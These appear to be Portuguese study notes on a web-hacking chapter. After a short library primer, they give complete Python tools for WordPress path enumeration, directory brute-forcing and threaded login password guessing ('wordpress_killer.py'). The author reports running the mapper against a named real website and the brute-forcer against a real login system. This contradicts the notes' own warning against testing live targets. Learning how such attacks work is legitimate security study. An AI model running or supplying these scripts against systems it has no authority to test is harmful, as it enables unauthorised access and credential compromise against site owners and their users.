# Capitulo 5 

Nesse capítulo são abordadas algumas técnicas de invsão web

## Táticas de invasão web

Tomando como base o fato de que as ferramentas de exploração web já são bem avançadas e consolidadas, o objetivo principal do capítulo é dar nuances de como realizar exploração web em 3 principais cenários:

- Você conhece o framwork web que o alvo utiliza e ele é de código aberto. Criaremos um mapa que mostra a hierarquia da aplicação localmente e utilizaremos essas informações para localizar arquivos e diretórios reais no alvo

- Você conhece apenas a URL do alvo, então usaremos um ataque de [força bruta](https://en.wikipedia.org/wiki/Brute-force_attack) utilizando uma lista de palavras para gerar uma lista de caminhos de arquivos e nomes de diretórios possíveis no alvo. Em seguida tentaremos nos conectar com a lista resultante de caminhos possíveis no alvo

- Você conhece a URL do alvo e a página de login. Usaremos uma lista de palavras para forçar nossa entrada no alvo

### Utilizando bibliotecas web

Breve introdução para dizer que usaremos as libs mais atualizadas para web.

### A biblioteca urllib2 para Python 2.x

Nessa parte ele utiliza uma introdução à lib `urllib2` do Python2, logo não vi importância em trazê-la aqui, pois estamos estudando Python3.

### A biblioteca urllib para Python 3.x

Agora sim, com a biblioteca de manipulação de URL nova, é possível não só fazer requests, mas também analisar erros e analisar a URL. No código `simple_requests.py`:

```py
import urllib.parse
import urllib.request

url = 'http://boodelyboo.com'
# get 
with urllib.request.urlopen(url) as response:
    content = response.read()
print(content)    

# post data, em JSON
info = {'user': 'caio', 'passwd': '123412'}

data = urllib.parse.urlencode(info).encode() # converte para bytes o JSON gerado
# gera a requisicao
req = urllib.request.Request(url, data)
# faz e le a resposta da requisicao
with urllib.request.urlopen(req) as response:
    content = response.read()
print(content)
```

### A biblioteca requests

A lib `requests` não faz parte da biblioteca padrão do Python, mas é recomendada oficialmente pelos desenvolvedores da linguagem. Para instalá-la, use:

```bash
pip install requests
```

Ela consegue lidar com Cookies, entre outras coisas. Veremos em breve seu potencial. Contudo, no mesmo arquivo `simple_requests.py`, agora usaremos a nova lib para realizar a mesma requisição:

```py
import requests

...     # Código anterior

# requests

# post
response = requests.post(url, data=data)
print(response.text)        # response.text = string; response.content = bytestring
```


### Os pacotes lxml e BeautifulSoup

Ao receber uma resposta HTML, essas libs ajudam a analisar o seu conteúdo. Elas são intercambiáveis e ambas tem vantagens e desvantagens. A `lxml` contém um parser um pouco mais rápido, já a `BeautifulSoup` detecta automaticamente a codificação da página HTML de destino.

É possível instalar ambas através de:

```bash
pip install lxml
pip install beautifulsoup4
```

No exemplo do livro, o autor nos pede para supor que  o conteúdo de HTML de uma solicitação está armazenado uma variável chamada `content`. Com o `lxml`, podemos analisar o código da seguinte forma (em `simple_html.py`):

```py
# Import do BytesIO para a manipulação de strings de bytes como objeto de arquivo
from io import BytesIO
# Import do etree, que é o nosso parser
from lxml import etree

import requests

# Capturamos o HTML da página com um GET simples
url = 'https://nostarch.com'
r = requests.get(url)
content = r.content # lembrando que r.content está em bytes

# Instanciamos o Parser de HTML
parser = etree.HTMLParser()
# Passamos uma string de bytes como objeto e usamos o parse
content = etree.parse(BytesIO(content), parser=parser)

# procuramos o "findal" de '//a' (que é o indicativo de procura de ancoras do tipo "<a>", que geralmente é usada para fazer links)
for link in content.findall('//a'): 
    # Printa-se o atributo 'href' do link e o seu texto
    print(f"{link.get('href')} -> {link.text}")
```

Agora temos quase um `webscrapper` de um HTML. Faremos agora com o BeautifulSoup:

```py
... # Código do lxml

# Import do BS4
from bs4 import BeautifulSoup as bs

url = 'http://bing.com'
r = requests.get(url)

# Instancia o parser para html
tree = bs(r.text, 'html.parser')
# Procura as ancoras "<a>" como links
for link in tree.find_all('a'):
    print(f"{link.get('href')} -> {link.text}")
```

Pronto, agora temos uma forma de analisar HTMLs.

### Mapeando instalações de aplicações web de código aberto

Sistemas de gerenciamento de conteúdo (CMS), como WordPress, plataformas de blogs, etc, ajudam não-desenvolvedores a rodar suas aplicações web e são comuns em ambientes de hospedagem compartilhada. Quando em código aberto, esses CMS podem conter informações de possíveis diretórios a serem alvos de um ataque e, com inspiração nisso, serão discutidos nos próximos tópicos.

### Mapeando o framework WordPress

Você pergunta ao ChatGPT o que é um framework e ele te responde:

```
Um framework é uma estrutura de software reutilizável que fornece um conjunto de ferramentas, bibliotecas e padrões para facilitar o desenvolvimento de aplicações. Ele atua como uma base pronta, sobre a qual você pode construir sua aplicação, evitando reinventar a roda e permitindo que você se concentre nas partes específicas do seu projeto.
```

Um framework famoso é o do WordPress, que é usado para facilitar a criação de vários sites ao redor do mundo. É possível fazer o download do framwork através de um [link](https://br.wordpress.org/download/). Faça o download e descompacte o aqruivo em uma pasta acessível, pois ela será usada para gerar uma fila de diretórios a serem explorados.

Criaremos um arquivo `mapper.py`, ele nos ajudrará a percorrer a distribuição de um site WordPress. Nele, existirá a função `gather_paths()`, para percorrer a distribuição, e a variável `web_paths` para inserir os caminhos de arquivos completos em uma fila:

```py
# O import de contextlib serve para alterações no contexto de execução do código
# No nosso caso ela será usada para executá-lo na pasta onde foi feita a descompactação do WordPress
import contextlib
import os
import queue
import requests
import sys
import threading
import time

# Filtros de arquivos que não queremos ler no diretório
FILTERED = [".jpg", ".gif", ".png", ".css"]
# Site alvo e número de threads, serão usados nos próximos códigos
TARGET = "https://polijunior.com.br/"
THREADS = 10

# As duas filas, uma com os possíveis diretórios do site e outra com as respostas
web_paths = queue.Queue()
answers = queue.Queue()

# Procura no diretório todos os arquvios
def gather_paths():
    for root, _, files in os.walk('.'):
        for fname in files:
            if os.path.splitext(fname)[1] in FILTERED:  # Não lê os arquivos que estão no filtro
                continue
            path = os.path.join(root, fname)
            if path.startswith('.'):
                path = path[1:]

            path = path.replace('\\', '/') # Trata o sistema de arquivos windows
            # Imprime-os e adicona-os na fila
            print(path)
            web_paths.put(path)
            
# O uso do contextlib é para a mudança do diretório de execução no meio do programa,
# Pois leremos um download na pasta em 'path', mas, ao finalizar o código, finalizaremos-o na própria pasta do diretório
@contextlib.contextmanager
def chdir(path):
    """
    Ao inicializar, mudar para o diretorio especificado
    Ao finalizar, retornar ao diretorio original
    """
    # Guarda o diretório atual
    this_dir = os.getcwd()
    # Define que iremos usar o path como diretório de execução
    os.chdir(path)
    try:
        yield   # Retorna o diretório 'path' como o atual
    finally:
        os.chdir(this_dir)  # Ao terminar o código executado, volta para o diretório 
    
if __name__ == "__main__":
    with chdir("C:\\Users\\caioe\\Downloads\\wordpress"):   # Usar o gather_paths no diretório dado
        gather_paths()
    # Ao finalizar o gather_paths, o finally da funação chdir é chamado, voltando ao diretório atual
    input("Pressione Enter para continuar")                    
```

Note que esse código apenas filtra as possíveis rotas do WordPress. Ele sera complementado colocando-o no contexto de um alvo real.

**OBSERVAÇÃO**: O block `try-expect` do python funciona da seguinte maneira:

```py
try:
    # Tenta fazer algo que pode dar errado
except AlgumErro as e:
    # Trata algum possível erro
else:
    # É executado caso o try dê certo
finally:
    # É executado independente do try ter dado certo ou não
```

### Realizando testes no alvo ativo

Agora, no mesmo código, adicionaremos a função `test_remote()` e a função `run()`, para analisar as respostas para alguns diretórios em `web_paths` de um alvo em WordPress real. Isso é equivalente a usar um `wordlist`:

```py
import contextlib
import os
import queue
import requests
import sys
import threading
import time

FILTERED = [".jpg", ".gif", ".png", ".css"]
TARGET = "https://polijunior.com.br/"
THREADS = 10

answers = queue.Queue()
web_paths = queue.Queue()

def gather_paths():
    for root, _, files in os.walk('.'):
        for fname in files:
            if os.path.splitext(fname)[1] in FILTERED:
                continue
            path = os.path.join(root, fname)
            if path.startswith('.'):
                path = path[1:]
                
            path = path.replace('\\', '/')
            print(path)
            web_paths.put(path)

# Test remote para testar os diretórios o alvo WP
def test_remote():
    while not web_paths.empty():    # enquanto há diretórios a serem vistos
        path = web_paths.get()      # pega na fila o diretório
        url = f'{TARGET}{path}'     # junta-o à url
        time.sleep(2)
        r = requests.get(url)       # tenta fazer o GET
        if r.status_code == 200:
            answers.put(url)
            sys.stdout.write('+')   # se a resposta for positiva, ele coloca na fila de respostas e printa +
        else:
            sys.stdout.write('x')   # caso não seja, printa x
        sys.stdout.flush()
                    
@contextlib.contextmanager
def chdir(path):
    """
    Ao inicializar, mudar para o diretorio especificado
    Ao finalizar, retornar ao diretorio original
    """
    
    this_dir = os.getcwd()
    os.chdir(path)
    try:
        yield
    finally:
        os.chdir(this_dir)
    
# Inicia várias threads para a execução do test_remote
def run():
    mythreads = list()
    for i in range(THREADS):
        print(f'Iniciando thread {i}')
        t = threading.Thread(target=test_remote)
        mythreads.append(t)
        t.start()
        
    for thread in mythreads:
        thread.join()
    
if __name__ == "__main__":
    with chdir("C:\\Users\\caioe\\Downloads\\wordpress"):
        gather_paths()
    input("Pressione Enter para continuar")
    
    # Roda o código 
    run()
    with open('myanswers.txt', 'w') as f:
        while not answers.empty():
            f.write(f'{answers.get()}\n')       # para as repostas positivas, escreve-as em um arquivo
    print('Concluido')
```

### Explorando o código

Após a execução do código, foi bem sucedida a captura das páginas-padrão do WordPress do site.

### Descobrindo diretórios e localizações de arquivo com ataque de força bruta

Muitas vezes, você não terá conhecimento sobre o sistema de arquivos do seu alvo. Isso implica na utilização, de maneira geral, de *spiders*, como os encontrados no BurpSuite, para encontrar o caminho que uma mensagem está percorrendo. No entanto, é proveitoso criarmos nossa própria ferramenta de força bruta para entendermos o sistema de arquivos do alvo. Para isso precisaremos de uma wordlist

No Kali, uma wordlist comum é a `rockyou.txt`, que já vem embutida no sistema através do diretório `/usr/share/wordlists`. Contudo, utilizaremos a wordlist do [SVNDigger](https://github.com/nathanmyee/SVNDigger), que existem para busca de diretórios.

Criaremos o nosso `bruter.py`:

```py
import queue
import requests
import threading
import sys

# Agent é o agente q fará uma request online, não é usado neste código ainda
AGENT = "Mozilla/5.0 (x11; Linux x86_64; rv:19) Gecko/20100101 Firefox/19.0"
# Extensões de palavras
EXTENSIONS = ['.php', '.bak', '.orig', '.inc']
# Site-alvo
TARGET = 'http://testphp.vulnweb.com'
# Número de threads
THREADS = 50
# Local da wordlist
WORDLIST = 'C:\\Users\\caioe\\Downloads\\wordlists_svn\\SVNDigger-master\\SVNDigger\\all.txt'

# Função get_words, que pega todas as palavras da wordlist e as coloca numa fila. Ela também coloca extensões sobre ela
def get_words(resume=None):
        
    # Função interna para colocar palavras na fila
    def extend_words(word):
        if '.' in word:
            words.put(f'/{word}')   # se é um nome com extensão (ex: a.html -> /a.html)
        else:
            words.put(f'/{word}/')  # se é um nome sem extensão (ex: b -> /b/)
            
        for extension in EXTENSIONS:
            words.put(f'/{word}{extension}')    # gera mais palavras com as extensões desejadas
      
    with open(WORDLIST) as f:   # Lê o arquivo
        raw_words = f.read()
    
    found_resume = False    # variável de verificação, para atestar se a palavra-inicio já foi perpassada na lista
    words = queue.Queue()   # fila de palavras
    
    for word in raw_words.split():  # divide todo o arquivo em um array de strings
        if resume is not None:      # caso tenha uma palavra-inicio, a função não faz nada até encontrá-la 
                                    # (para gerar uma lista parcial de palavras)
            if found_resume:
                extend_words(word)  # Caso ela já tenha sido encontrada, adiciona normalmente à lista
            elif word == resume:
                found_resume = True # ao encontrar a palavra, ele fala ao programa "Continue daqui"
                print(f'Retornando lista de palavras feitas a partir de: {resume}')
        else:
            # Caso não tenha palavra-inicio, extende todas as palavras da lista
            print(word)
            extend_words(word)

    return words


if __name__ == '__main__':
    w = get_words()
    print("Pressione Enter para continuar")
```

Agora, adaptando o código para fazer as requests na função `dir_bruter()`:

```py
import queue
import requests
import threading
import sys

AGENT = "Mozilla/5.0 (x11; Linux x86_64; rv:19) Gecko/20100101 Firefox/19.0"
EXTENSIONS = ['.php', '.bak', '.orig', '.inc']
TARGET = 'http://testphp.vulnweb.com'
THREADS = 50
WORDLIST = 'C:\\Users\\caioe\\Downloads\\wordlists_svn\\SVNDigger-master\\SVNDigger\\all.txt'

def get_words(resume=None):
        
    def extend_words(word):
        if '.' in word:
            words.put(f'/{word}')
        else:
            words.put(f'/{word}/')
            
        for extension in EXTENSIONS:
            words.put(f'/{word}{extension}')
      
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    found_resume = False
    words = queue.Queue()
    
    for word in raw_words.split():
        if resume is not None:
            if found_resume:
                extend_words(word)
            elif word == resume:
                found_resume = True
                print(f'Retornando lista de palavras feitas a partir de: {resume}')
        else:
            extend_words(word)

    return words

# Nova função dir_bruter() que cria requests apenas com um header simples (dizendo que é uma request feita de um navegador)
# e tenta fazer a resquest
def dir_bruter(words):
    header = {'User-Agent': AGENT}
    while not words.empty():
        url = f'{TARGET}{words.get()}'  # faz a url com as palavras da wordlist
        try:
            r = requests.get(url, headers=header)
        except requests.exceptions.ConnectionError: # caso não seja feita, printa x
            sys.stdout.write('x')
            sys.stdout.flush()
            continue
        
        if r.status_code == 200:
            print(f'\nSucesso ({r.status_code}: {url})')    # caso seja sucesso (codigo 200) ele indica onde foi feita
        elif r.status_code == 404:  # cason não seja, retorna .
            sys.stdout.write('.')
            sys.stdout.flush()
        else:
            print(f'{r.status_code} => {url}')  

        
if __name__ == '__main__':
    w = get_words('')
    print("Pressione Enter para continuar")
    sys.stdin.readline()
    
    for _ in range(THREADS):    # chama threads para executar a função
        t = threading.Thread(target=dir_bruter, args=(w, ))
        t.start()
```

### Explorando o código

Você pode executá-lo sem os prints e o input, removendo-os e colocando o output em um arquivo:

`python bruter.py > ./output.txt`

Pronto! Agora você tem um buscador de diretórios de sites!

### Autenticação de formulário HTML com ataque de força bruta

Criaremos um sistema de força bruta simples para sites WordPress. Os autores mencionam que eles ainda não possuem bloqueios de login ou CAPTCHAs rigorosos. Para isso veremos como funciona o formulário padrão do WordPress:

```php
<form name="loginform" id="loginform"
    action="http://boodelyboo.com/wordpress/wp-login.php" method="post">
    <p>
        <label for="user_login">Username or Email Address</label>
        <input type="text" name="log" id="user_login" value="" size="20"/>
    </p>
    
    <div class="user-pass-wrap">
        <label for="user_pass">Password</label>
            <div class="wp-pwd">
                <input type="password" name="pwd" id="user_pass" value="" size="20" />
            </div>
    </div>

    <p class="submit">
        <input type="submit" name="wp-submit" id="wp-submit" value="Log In" />
        <input type="hidden" name="testcookie" value="1" />
    </p>
</form>
```

Foram omitidas partes não importantes para o estudo, mas restaram alguns fatos:

- O login é feito através de um POST HTTP
- O campo `pwd` é onde a senha é colocada
- O campo `log` é onde o usuário é colocado

Logo, seguindo a lógica, deveremos elaborar um fluxo para realizar um ataque de força-bruta:

1. Recuperar a página de login e aceitar os Cookies solicitados
2. Extrair todos os elementos do formulário HTML
3. Definir o nome de usuário e/ou senha com uma das tentativas do nosso dicionário
4. Enviar um POST para o script de processamento de login com todos os campos do HTML e com os cookies armazenados
5. Realizar o teste para ver se conseguiu-se fazer a solicitação

Para isso, poderemos pegar uma wordlist [cain-and-abel.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Software/cain-and-abel.txt) ela pode ser pega diretamente do github. Nesse mesmo repositório existem outras wordlists para possíveis outros projetos de hacking. Essa wordlist vem de um programa de recuperação de senhas do windows chamado `Cain & Abel`.

É importante salientar que nunca se deve realizar esses testes em um alvo ativo. Sempre configure uma instância da sua aplicação web  de destino com credenciais conhecidas.

Criaremos um novo arquivo `wordpress_killer.py`:

```py
# Utilizaremos o mesmo parser que usamos anteriormente
from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

# Uma mensagem de verificação de login. Deve ser diferente para cada site
SUCCESS = '"loggedIn": true'
TARGET = "link" # link - alvo
WORDLIST = 'C:\\Users\\caioe\\Desktop\\VM\\wordlists\\cain.txt'

# Pega as palavras da wordlist
def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

# Procura os campos de input do alvo, parecido com o parser feito antes
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('.//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

# Nossa classe Bruter, que fará o ataque
class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nIniciando ataque de força bruta em {url}\n')
        print("Concluida a configuracao na qual o nome de usuario eh: %s\n" % username)

    # Essa função apenas instancia as threads de execução 
    def run_bruteforce(self, passwords, type):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords, type, ))
            t.start()
    
    # Web bruter recebe a lista de palavras e o tipo de request (se é JSON ou URL)
    def web_bruter(self, passwords, type):
        session = requests.Session()        # inicia uma sessão, para manter o login
        resp0 = session.get(self.url)       # faz um get na URL de target (pagina de login) para achar seus campos com o parser
        params = get_params(resp0.content)  # procura os parametros usando o parser
        params['eid'] = self.username       # Intancia os campos a serem colocados, voce pode colocar como quiser, 
                                            # mas eles devem obedecer o forms de request
        
        # Usado para WP. Para Tidia-AE, usarei o outro
        if type == 'JSON':
            while not passwords.empty() and not self.found:
                time.sleep(5)
                pw = passwords.get()
                print(f'Tentando nome de usuario/senha {self.username}/{pw:<10}')   # Print da tentativa
                params['pw'] = pw
            
                resp1 = session.post(self.url, data=params) # coloca o JSON na request e faz-la
                if SUCCESS in resp1.content.decode():       # se acha a string de sucesso na resposta, printa a senha e para
                    self.found = True
                    print(f'\n Ataque de força bruta bem sucedido')
                    print("Nome de usuario eh: %s" % self.username)
                    print("Senha eh: %s\n" % pw)
                    print('Concluido: limpando as outras threads...')
    
        if type == 'URL':
            while not passwords.empty() and not self.found:
                # Mesmo sentido. No caso foi usado para o Tidia-ae e tem os campos eid (user) pw (password) e submit ('Login')
                time.sleep(5)
                pw = passwords.get()
                params['pw'] = pw
                params['submit'] = 'Login'
                print(f'Tentando nome de usuario/senha {self.username}/{pw:<10}')   
                in_link_url = f"{self.url}?{'&'.join(f'{k}={v}' for k, v in params.items())}"   # Gera a URL customizada com os parametros
                resp1 = session.post(in_link_url)

                if SUCCESS in resp1.content.decode():
                    self.found = True
                    print(f'\n Ataque de força bruta bem sucedido')
                    print("Nome de usuario eh: %s" % self.username)
                    print("Senha eh: %s\n" % pw)
                    print('Concluido: limpando as outras threads...')
            
if __name__ == '__main__':
    words = get_words()
    b = Bruter('user', TARGET)
    b.run_bruteforce(words, 'URL')
```

Pronto! Agora você tem um código de brute-force eficiente!

### Explorando o código

O código acima está diferente do livro pois preferi usá-lo em um site que não é WordPress e que não recebe um JSON. Contudo, foi possível modificá-lo de uma forma bacana e agora ficará mais fácil para as próximas vezes. Ele foi estado com a word list e deu certo!

**OBSERVAÇÃO**: É importante entender como o site recebe e responde as request de login para executar o código!
